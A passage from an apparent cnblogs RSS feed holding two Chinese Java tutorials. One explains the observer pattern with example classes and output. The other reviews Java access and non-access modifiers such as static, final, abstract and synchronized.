&lt;p&gt;定义了对象之间的一对多依赖，当一个对象改变状态时，它的所有依赖者都会收到通知并自动更新。主题（Subject）是被观察的对象，而其所有依赖者（Observer）称为观察者。&lt;br/&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/wupeixuan/1184074/o_%e5%be%ae%e4%bf%a1%e6%88%aa%e5%9b%be_20180324111351.png&quot; alt=&quot;观察者模式定义实例图&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;设计原则&quot;&gt;设计原则&lt;/h2&gt;
&lt;p&gt;为交互对象之间的松耦合设计而努力：当两个对象之间松耦合，它们依然可以交互，但是不清楚彼此的细节。由于松耦合的两个对象之间互相依赖程度很低，因此系统具有弹性，能够应对变化。&lt;/p&gt;
&lt;h2 id=&quot;uml类图&quot;&gt;UML类图&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/wupeixuan/1184074/o_TIM%e6%88%aa%e5%9b%be20180323174311.png&quot; alt=&quot;观察者模式类图&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;观察者模式实例&quot;&gt;观察者模式实例&lt;/h2&gt;
&lt;p&gt;定义被观察者接口&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package com.wpx.observer;&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * 抽象被观察者接口&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * 定义了添加、删除、通知观察者方法&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;interface&lt;/span&gt; Subject {
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;registerObserver&lt;/span&gt;(Observer o);

    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;removeObserver&lt;/span&gt;(Observer o);

    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;notifyObservers&lt;/span&gt;();
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;定义观察者接口&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package com.wpx.observer;&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * 抽象观察者接口&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * 定义了一个update()方法，当被观察者调用notifyObservers()方法时，观察者的update()方法会被回调&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;interface&lt;/span&gt; Observer {
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;update&lt;/span&gt;(String message);
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;定义被观察者，实现Subject接口，对Subject接口的三个方法进行了具体实现，同时有一个List集合，用以保存注册的观察者，等需要通知观察者时，遍历该集合。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package com.wpx.observer;&lt;/span&gt;

&lt;span class=&quot;kw&quot;&gt;import java.util.ArrayList;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;import java.util.List;&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * 具体的被观察者&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; ConcreteSubject &lt;span class=&quot;kw&quot;&gt;implements&lt;/span&gt; Subject {
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; List&amp;lt;Observer&amp;gt; list;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String message;

    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;ConcreteSubject&lt;/span&gt;() {
        list = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;Observer&amp;gt;();
    }

    &lt;span class=&quot;fu&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;registerObserver&lt;/span&gt;(Observer o) {
        list.&lt;span class=&quot;fu&quot;&gt;add&lt;/span&gt;(o);
    }

    &lt;span class=&quot;fu&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;removeObserver&lt;/span&gt;(Observer o) {
        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!list.&lt;span class=&quot;fu&quot;&gt;isEmpty&lt;/span&gt;())
            list.&lt;span class=&quot;fu&quot;&gt;remove&lt;/span&gt;(o);
    }

    &lt;span class=&quot;fu&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;notifyObservers&lt;/span&gt;() {
        &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; list.&lt;span class=&quot;fu&quot;&gt;size&lt;/span&gt;(); i++) {
            Observer observer = list.&lt;span class=&quot;fu&quot;&gt;get&lt;/span&gt;(i);
            observer.&lt;span class=&quot;fu&quot;&gt;update&lt;/span&gt;(message);
        }
    }

    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;send&lt;/span&gt;(String s) {
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;message&lt;/span&gt; = s;
        System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;更新消息:&quot;&lt;/span&gt; + s);
        &lt;span class=&quot;co&quot;&gt;//消息更新，通知所有观察者&lt;/span&gt;
        &lt;span class=&quot;fu&quot;&gt;notifyObservers&lt;/span&gt;();
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;定义观察者，实现Observer接口，对方法进行实现&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package com.wpx.observer;&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * 具体的观察者&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; ConcreteObserver &lt;span class=&quot;kw&quot;&gt;implements&lt;/span&gt; Observer {
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String name;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; String message;

    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;ConcreteObserver&lt;/span&gt;(String name) {
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;name&lt;/span&gt; = name;
    }

    &lt;span class=&quot;fu&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;update&lt;/span&gt;(String message) {
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;message&lt;/span&gt; = message;
        &lt;span class=&quot;fu&quot;&gt;read&lt;/span&gt;();
    }

    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;read&lt;/span&gt;() {
        System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(name + &lt;span class=&quot;st&quot;&gt;&quot; 收到消息：&quot;&lt;/span&gt; + message);
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;测试观察者模式，先创建一个被观察者对象(公司)，再创建三个观察者对象(职工)，公司先发布消息说今天加班，张三一听，不干了辞职，之后公司又发布消息明天放假，张三已经辞职，因此收不到消息，其他观察者(职工)可以收到消息。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package com.wpx.observer;&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * 测试观察者模式&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; ObserverDemo {
    &lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;main&lt;/span&gt;(String[] args) {
        ConcreteSubject subject = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;ConcreteSubject&lt;/span&gt;();

        Observer observer1 = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;ConcreteObserver&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;张三&quot;&lt;/span&gt;);
        Observer observer2 = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;ConcreteObserver&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;李四&quot;&lt;/span&gt;);
        Observer observer3 = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;ConcreteObserver&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;王五&quot;&lt;/span&gt;);

        subject.&lt;span class=&quot;fu&quot;&gt;registerObserver&lt;/span&gt;(observer1);
        subject.&lt;span class=&quot;fu&quot;&gt;registerObserver&lt;/span&gt;(observer2);
        subject.&lt;span class=&quot;fu&quot;&gt;registerObserver&lt;/span&gt;(observer3);

        subject.&lt;span class=&quot;fu&quot;&gt;send&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;今天加班&quot;&lt;/span&gt;);

        subject.&lt;span class=&quot;fu&quot;&gt;removeObserver&lt;/span&gt;(observer1);

        subject.&lt;span class=&quot;fu&quot;&gt;send&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;明天放假&quot;&lt;/span&gt;);
    }


}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行结果&lt;/p&gt;
&lt;pre class=&quot;txt&quot;&gt;
&lt;code&gt;更新消息:今天加班
张三 收到消息：今天加班
李四 收到消息：今天加班
王五 收到消息：今天加班
更新消息:明天放假
李四 收到消息：明天放假
王五 收到消息：明天放假

Process finished with exit code 0&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;观察者模式是松偶合的。改变主题或观察者中的一方，另一方不会受到影响。&lt;/li&gt;
&lt;li&gt;JDK中也有自带的观察者模式，但是被观察者是一个类而不是接口，限制了它的使用和复用能力。JDK内置观察者模式java.util.Observer接口， java.util.Observable类。&lt;/li&gt;
&lt;li&gt;在JavaBean和Swing中也有观察者模式的设计思想。&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Sat, 24 Mar 2018 04:17:00 +0000</pubDate>
<dc:creator>武培轩</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wupeixuan/p/8638395.html</dc:identifier>
</item>
<item>
<title>Java基础知识回顾之二 ----- 修饰符和String - 虚无境</title>
<link>http://www.cnblogs.com/xuwujing/p/8638329.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xuwujing/p/8638329.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;在上一篇中，回顾了Java的&lt;a href=&quot;http://blog.csdn.net/qazwsxpcm/article/details/79595857&quot;&gt;基本数据类型&lt;/a&gt; ，这篇就来回顾下Java中的一些修饰符以及String。&lt;/p&gt;
&lt;h2 id=&quot;修饰符介绍&quot;&gt;修饰符介绍&lt;/h2&gt;
&lt;p&gt;Java修饰符主要分为两类:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;访问修饰符&lt;/li&gt;
&lt;li&gt;非访问修饰符&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;其中访问修饰符主要包括 private、default、protected、public。&lt;br/&gt;非访问修饰符主要包括 static、final、abstract、synchronized。&lt;/p&gt;
&lt;h3 id=&quot;访问修饰符&quot;&gt;访问修饰符&lt;/h3&gt;
&lt;p&gt;访问修饰符可以使用下图这张表来说明访问权限:&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td align=&quot;center&quot;&gt;public&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td align=&quot;center&quot;&gt;protected&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td align=&quot;center&quot;&gt;default&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td align=&quot;center&quot;&gt;private&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Y&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;简单点查看访问级别的话，级别是由低到高。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; private＜default＜protected＜public&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;private&quot;&gt;&lt;strong&gt;private&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;被private修饰的变量、方法仅限在本类中使用。&lt;/strong&gt;&lt;br/&gt;所以private是最严的的访问级别，主要用于隐藏类的一些细节实现和保护类的数据。&lt;br/&gt;例如pojo类就是使用private修饰变量，对外提供setter和getter的方法。&lt;br/&gt;还有如果使用private用来修饰构造方法的话，该类是不能实例化的。这种在单例模式中可以经常看到！&lt;/p&gt;
&lt;p&gt;虽然private主要用于修饰变量和方法，不过也可以修饰内部类，只不过是内部类。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Test{
    //修饰一个私有变量
    private int count=1;
    //修饰一个私有方法
    private int add(int i,int j){
        return i+j;
   }
    private class Test1{            
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意：private不能修饰外部类。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为Test类中的变量和方法是私有的，所以其他类无法调用！&lt;br/&gt;例:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Test2 {
    public static void main(String[] args) {
        Test t=new Test();
        //下面的变量和方法是无法获取的
        //t.count=2;
        //t.add(1,2);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;说明:其实private修饰的方法和变量是可以使用反射调用，不过这里就不说明了。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;default&quot;&gt;&lt;strong&gt;default&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;default:就是不使用任何修饰符。类、接口、变量、方法都可以使用。不过仅限在同一包下。&lt;/p&gt;
&lt;p&gt;例如:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;class Test{
     int count=1;
     int add(int i,int j){
            return i+j;
     }
    interface Test1{
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;protected&quot;&gt;&lt;strong&gt;protected&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;被protected修饰的变量、方法仅仅对同一包内的类和所有子类可见。&lt;/p&gt;
&lt;p&gt;例如:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Test{
    protected int count=1;
    protected int add(int i,int j){
            return i+j;
     }
     protected class Test1{
     }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在同包下可以直接调用，如果不在同包，则需要继承才可以使用。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Test2 extends Test{
    public static void main(String[] args) {
        Test t=new Test();
        t.count=2;
        t.add(1,2);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意：protected不能修饰外部类。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;public&quot;&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;public:修饰的类、接口、变量、方法对所有类都可以使用。&lt;/p&gt;
&lt;p&gt;例如:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;   public class Test{
    public int count=1;
    public int add(int i,int j){
            return i+j;
     }
  }&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;非访问修饰符&quot;&gt;非访问修饰符&lt;/h2&gt;
&lt;p&gt;为了实现一些其他的功能，Java 也提供了许多非访问修饰符。&lt;/p&gt;
&lt;h3 id=&quot;static&quot;&gt;&lt;strong&gt;static&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;static&lt;/strong&gt;: 用来修饰类变量和类方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;静态变量&lt;/strong&gt;：&lt;br/&gt;static在修饰类变量的时候，无论该类被实例化了多少次，它的静态变量只有一份拷贝。静态变量也被称为类变量。局部变量是不能被声明为static变量的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;静态方法&lt;/strong&gt;：&lt;br/&gt;static在修饰类方法的时候，静态方法是不能使用类的非静态变量。静态方法可以直接通过类名调用，因此静态方法中是不能用&lt;strong&gt;this&lt;/strong&gt;和&lt;strong&gt;super&lt;/strong&gt;关键字的。&lt;/p&gt;
&lt;p&gt;示例:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
 public class Test{
    public  String name=&quot;xuwujing&quot;;
    public  static String name2=&quot;xuwujing&quot;;
    
    public  static String getName() {
    //这个一句 会报错  因为静态方法是不能使用类的非静态变量
    //String reult=name;
    //这一句就可以
    String reult=name2;
    return reult;
     }
    
    //main方法是静态方法，可以直接调用本类中的静态方法和静态变量
    public static void main(String[] args) {
        System.out.println(name2);
        System.out.println(getName());
    }
    
    //该方法是不静态方法，所以调用本类中的静态方法和静态变量时，
    //需要使用classname.variablename和 classname.methodname的方式访问
    private void print(){
        System.out.println(Test.name2);
        System.out.println(Test.getName());
     }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在这里顺便提一下，static 静态块。&lt;br/&gt;在JVM类加载机制中，&lt;strong&gt;如果类存在直接的父类并且这个类还没有被初始化，那么就先初始化父类；如果类中存在初始化语句，就依次执行这些初始化语句。&lt;/strong&gt;&lt;br/&gt;可能上述的两句话不太好理解，那么这里我们来运行下代码查看其结果，通过结果可能就能更好的理解上述语句的话了。&lt;/p&gt;
&lt;p&gt;示例:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;class HelloA {

    public HelloA() {
        System.out.println(&quot;HelloA&quot;); 
    }
    
    { System.out.println(&quot;I'm A class&quot;); } 
    
    static { System.out.println(&quot;static A&quot;); } 

}
public class HelloB extends HelloA{
    public HelloB() {
        System.out.println(&quot;HelloB&quot;); 
    }
    
    { System.out.println(&quot;I'm B class&quot;); }  
    
    static { System.out.println(&quot;static B&quot;); } 
    
    public static void main(String[] args) {
        new HelloB();   
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;static A
static B
I'm A class
HelloA
I'm B class
HelloB&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;那么根据这个类返回的结果是不是感觉更好理解了呢？&lt;br/&gt;&lt;strong&gt;创建对象时构造器的调用顺序是：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;先初始化静态成员，然后调用父类构造器，再初始化非静态成员，最后调用自身构造器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;那么static修饰符这块的运用可以总结如下:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;静态变量在内存中只有一个拷贝，在类的所有实例中共享。&lt;/li&gt;
&lt;li&gt;在静态方法中不能直接访问实例方法和实例变量，反之可以。&lt;/li&gt;
&lt;li&gt;在静态方法中不能使用this和super关键字。&lt;/li&gt;
&lt;li&gt;静态方法不能被abstract修饰。&lt;/li&gt;
&lt;li&gt;静态方法和静态变量都可以通过类名直接访问。&lt;/li&gt;
&lt;li&gt;当类被加载时，静态代码块只被加载一次。有多个静态变量或块时，按声明顺序加载。&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;h3 id=&quot;final&quot;&gt;&lt;strong&gt;final&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;final&lt;/strong&gt; :用来修饰类、方法和变量。&lt;br/&gt;final 修饰的类不能够被继承，修饰的方法不能被继承类重新定义，修饰的变量为常量，是不可修改的。&lt;br/&gt;如果上述语句不好理解的话，我们可以通过编写相关代码进行实验。&lt;br/&gt;定义一个final修饰的变量、方法以及类。然后进行相关的测试&lt;/p&gt;
&lt;p&gt;示例:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
 public class Test{
        //定义一个final修饰的变量
    public  static final String name=&quot;xuwujing&quot;;
    
  public static void main(String[] args) {
        //这句会报错  因为该变量已经被final修饰了
        name=&quot;张三&quot;;
    }
    //类加上final之后，该类是无法被继承的
    final class Test2{
    }
    //这句会报错，因为Test2是被final修饰的类
    class Test3 extends Test2{
    }
    
    class Test4{
        //定义一个被final修饰的方法
         final Date getTime(){
            return new Date();
        }
    }
    
    class Test5 extends Test4{
        //这句会报错，因为final方法是不能被子类修改的。
        Date getTime(){
        return new Date();
        }
    }
  }
 &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从上述 代码结果，我们可以得出一下结论:&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;final修饰类：表示该类不能被继承；&lt;br/&gt;final修饰方法：表示方法不能被重写；&lt;br/&gt;final修饰变量：表示变量只能一次赋值以后值不能被修改（常量）;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;abstract&quot;&gt;abstract&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;abstract&lt;/strong&gt; ：用来创建抽象类和抽象方法。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;Java是面向对象的语言，而抽象类是Java语言中对抽象概念进行定义的一种机制，也正是因为这个，所以赋予了Java强大的面向对象的能力。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;修饰类&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;会使这个类成为一个抽象类，这个类将不能生成对象实例，但可以做为对象变量声明的类型（见后面实例），也就是编译时类型。抽象类就相当于一类的半成品，需要子类继承并覆盖其中的抽象方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;修饰方法&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;会使这个方法变成抽象方法，也就是只有声明而没有实现，需要子类继承实现。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里依旧使用一个简单例子来进行理解。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class AbstractTest{
    public static void main(String[] args) {
        //这句会报错，因为抽象类不能实例化
        // Animal a=new Animal();
        //抽象类可以实例化重写该类抽象方法的子类
        Animal a = new Dog();
        a.show();
    }
}
abstract class Animal{
    abstract void show();
    public void print(){
        System.out.println(&quot;Animal&quot;);
    }
}
//继承抽象类需要实现抽象类的方法
class Dog extends Animal{   
    @Override
    void show() {
        System.out.println(&quot;This is Dog!&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;总结:&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;1、抽象类和抽象方法都需要被abstract修饰。抽象方法一定要定义在抽象类中。&lt;br/&gt;2、抽象类不可以创建实例，原因：调用抽象方法没有意义。&lt;br/&gt;3、只有覆盖了抽象类中所有的抽象方法后，其子类才可以实例化。否则该子类还是一个抽象类。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意事项:&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;1、抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。 2、一个类不能同时被 abstract 和 final&lt;br/&gt;修饰。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。&lt;br/&gt;3、抽象方法是一种没有任何实现的方法，该方法的的具体实现由子类提供。 4、抽象方法不能被声明成 final 和 static。&lt;br/&gt;5、任何继承抽象类的子类必须实现父类的所有抽象方法，除非该子类也是抽象类。&lt;br/&gt;6、如果一个类包含若干个抽象方法，那么该类必须声明为抽象类。抽象类可以不包含抽象方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;synchronized&quot;&gt;synchronized&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;synchronized&lt;/strong&gt;: 修饰的方法同一时间只能被一个线程访问。在多线程中运用很常见。&lt;br/&gt;synchronized 的解释如下:&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;synchronized 方法控制对类成员变量的访问：每个类实例对应一把锁，每个 synchronized方法都必须获得调用该方法的类实例的锁方能执行，否则所属线程阻塞，方法一旦执行，就独占该锁，直到从该方法返回时才将锁释放，此后被阻塞的线程方能获得该锁，重新进入可执行状态。这种机制确保了同一时刻对于每一个类实例，其所有声明synchronized 的成员函数中至多只有一个处于可执行状态（因为至多只有一个能够获得该类实例对应的锁），从而有效避免了类成员变量的访问冲突（只要所有可能访问类成员变量的方法均被声明为 synchronized）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;简单的来说，就是使用synchronized 修饰的方法，在多线程进行同时访问的时候，只会让一个线程先进行访问，其它的线程等候，当这个线程访问完了之后，再让下一个进行访问，依次类推。&lt;/p&gt;
&lt;p&gt;Java中还有两个不太常见的修饰符，&lt;strong&gt;transient&lt;/strong&gt; 和&lt;strong&gt;native&lt;/strong&gt;。&lt;/p&gt;
